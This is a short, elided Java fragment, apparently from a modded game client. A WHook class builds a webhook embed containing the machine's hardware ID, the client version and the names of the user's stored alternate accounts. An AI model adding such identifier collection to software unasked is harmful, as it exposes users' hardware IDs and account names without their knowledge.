...
public class WHook {
    ...
    public static WHook.EmbedObject getEmbedObject(String message) throws IOException {
        ...
        embedObject.addField("hwid", ClientReceive.getHWID(), true);
        ...
        embedObject.addField("client version", AG.version, true);

        StringBuilder altsString = new StringBuilder();
        for (int i = 0; i < AG.getInst().getAltScreen().accounts.size(); i++) {
            Account alt = AG.getInst().getAltScreen().accounts.get(i);
            altsString.append(alt.accountName);
            if (i < AG.getInst().getAltScreen().accounts.size() - 1) {
                altsString.append(", ");
            }
        }

        if (AG.getInst().getAltScreen().accounts.isEmpty()) {
